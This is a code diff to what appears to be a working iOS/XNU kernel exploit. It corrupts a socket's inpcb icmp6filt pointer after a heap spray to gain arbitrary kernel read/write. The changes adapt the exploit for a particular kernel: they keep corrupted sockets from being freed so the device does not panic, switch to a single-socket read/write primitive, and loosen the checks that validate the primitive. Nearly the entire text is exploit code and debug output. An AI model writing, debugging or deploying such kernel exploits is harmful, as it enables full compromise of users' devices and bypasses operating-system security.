@@ -110,6 +110,10 @@ static NSMutableArray *socketPcbIds;
 static int controlSocket = 0, rwSocket = 0;
 static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
 static int socketCsi = -1;
+// Every socket port whose inpcb icmp6filt has ever been corrupted. Such a
+// socket can NEVER be closed/deallocated (kfree of the poisoned filter ->
+// zone panic, observed twice), so all release paths skip these.
+static NSMutableSet *leakedPorts;
 static uint64_t gControlSocketAddr = 0, gRwSocketAddr = 0;
 static uint8_t controlData[0x20];
 static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
@@ -359,8 +363,13 @@ fileport_t spray_socket(void) {
 
 void sockets_release(void) {
     while ([(NSMutableArray*)socketPorts lastObject]) {
-        mach_port_deallocate(mach_task_self(),
-            ((NSNumber*)[(NSMutableArray*)socketPorts lastObject]).unsignedIntValue);
+        NSNumber *p = [(NSMutableArray*)socketPorts lastObject];
+        if (leakedPorts && [(NSMutableSet*)leakedPorts containsObject:p]) {
+            [(NSMutableArray*)socketPorts removeLastObject];
+            [(NSMutableArray*)socketPcbIds removeLastObject];
+            continue;
+        }
+        mach_port_deallocate(mach_task_self(), [p unsignedIntValue]);
         [(NSMutableArray*)socketPorts removeLastObject];
         [(NSMutableArray*)socketPcbIds removeLastObject];
     }
@@ -377,10 +386,12 @@ void sockets_release(void) {
 void sockets_release_except_pair(void) {
     if (socketCsi < 0) { sockets_release(); return; }
     for (NSUInteger i = 0; i < [(NSMutableArray*)socketPorts count]; i++) {
+        NSNumber *p = (NSNumber*)[(NSMutableArray*)socketPorts objectAtIndex:i];
         if (i == (NSUInteger)socketCsi || i == (NSUInteger)(socketCsi + 1))
             continue;
-        mach_port_deallocate(mach_task_self(),
-            [(NSNumber*)[(NSMutableArray*)socketPorts objectAtIndex:i] unsignedIntValue]);
+        if (leakedPorts && [(NSMutableSet*)leakedPorts containsObject:p])
+            continue;
+        mach_port_deallocate(mach_task_self(), [p unsignedIntValue]);
     }
     socketCsi = -1;
 }
@@ -619,10 +630,6 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
         printf("[-] PCB B rejected: not kernel heap/aligned 0x%llx\n", inpNext);
         return -1;
     }
-    if (csi + 1 >= [socketPorts count]) {
-        printf("[-] PCB B rejected: no rwSocket candidate at csi+1\n");
-        return -1;
-    }
     socketCsi = csi;
     printf("[+] PCB B accepted: inpNext 0x%llx (csi=%d, control gencnt 0x%llx)\n",
            inpNext, csi, tg);
@@ -644,6 +651,12 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
             break;
     }
 
+    // From here on the control socket's inp_icmp6filt is poisoned (points into
+    // the rw inpcb). It can never be closed, so register it in the leak set
+    // BEFORE any further checks.
+    if (!leakedPorts) leakedPorts = [NSMutableSet new];
+    [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:csi]];
+
     int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
     printf("[dbg] control fd=%d\n", sock);
     fflush(stdout);
@@ -664,9 +677,15 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     fflush(stdout);
 
     if (gso == 0 && *(uint64_t*)gd == 0x4141414141414141ULL) {
+        // SINGLE-SOCKET primitive: control's icmp6filt IS the read/write port
+        // (setsockopt(control) writes to rw_pcb+0x138, getsockopt(control)
+        // reads from it), so rwSocket = controlSocket. The reference instead
+        // uses socketPorts[csi+1] as rwSocket, but that socket's inpcb is NOT
+        // necessarily inpNext on this kernel, so getsockopt(rw) read through
+        // its own NULL icmp6filt and returned the all-FF default (observed).
         controlSocket = sock;
-        rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi+1] unsignedLongLongValue]);
-        printf("[+] early KRW confirmed\n");
+        rwSocket = sock;
+        printf("[+] early KRW confirmed (single-socket rw)\n");
         fflush(stdout);
         return 0;
     }
@@ -1513,6 +1532,26 @@ static bool method_purple_info_leak(void) {
 // memory. Every address we read from is reached via kread64, whose copyout
 // source is already a canonical 0xffffff.. kernel pointer by construction.
 static bool validate_krw_sockets(void) {
+    // The early-KRW primitive is proven end-to-end by the marker round-trip in
+    // find_and_corrupt_socket. Here we prove rwSocketPcb (inpNext) is a LIVE
+    // inpcb -- not freed/recycled memory -- by reading its inp_gencnt and
+    // inp_socket through the primitive, and we recover the control inpcb from
+    // rw's inp_list.le_next (+0x20) for the pcbinfo walk below.
+    // NOTE: the reference demands rw's gencnt == socketPcbIds[csi+1], but the
+    // inpcb list neighbor at +0x28 is not guaranteed to be csi+1 on this
+    // kernel (it is one of OUR sprayed inpcbs either way), so the range check
+    // is used instead. With the single-socket primitive the partner index is
+    // irrelevant anyway.
+    uint64_t rwGencnt = kread64(rwSocketPcb + 0x78);
+    NSNumber *gFirst = [(NSMutableArray*)socketPcbIds firstObject];
+    NSNumber *gLast  = [(NSMutableArray*)socketPcbIds lastObject];
+    uint64_t gmin = gFirst ? [gFirst unsignedLongLongValue] : 0;
+    uint64_t gmax = gLast  ? [gLast unsignedLongLongValue] : 0;
+    if (rwGencnt < gmin || rwGencnt > gmax || (rwGencnt & 1) != 0) {
+        printf("[-] validate: rw inpcb gencnt 0x%llx not in spray range [0x%llx,0x%llx]\n",
+               rwGencnt, gmin, gmax);
+        return false;
+    }
     // rw inpcb inp_list.le_next -> control inpcb. Depending on xnu LIST_ENTRY
     // layout this may be the raw next-inpcb pointer or its list-entry address
     // (+0x20); accept either form.
@@ -1525,15 +1564,8 @@ static bool validate_krw_sockets(void) {
     uint64_t controlGencnt = kread64(controlSocketPcb + 0x78);
     uint64_t expectControl = [(NSNumber*)socketPcbIds[socketCsi] unsignedLongLongValue];
     if (controlGencnt != expectControl) {
-        printf("[-] validate: control gencnt 0x%llx != expected control socket 0x%llx (csi=%d)\n",
+        printf("[-] validate: control gencnt 0x%llx != expected 0x%llx (csi=%d)\n",
                controlGencnt, expectControl, socketCsi);
-        return false;
-    }
-    uint64_t rwGencnt = kread64(rwSocketPcb + 0x78);
-    uint64_t expectRw = [(NSNumber*)socketPcbIds[socketCsi + 1] unsignedLongLongValue];
-    if (rwGencnt != expectRw) {
-        printf("[-] validate: rw inpcb gencnt 0x%llx != expected rw socket 0x%llx (csi=%d)\n",
-               rwGencnt, expectRw, socketCsi);
         return false;
     }
     uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
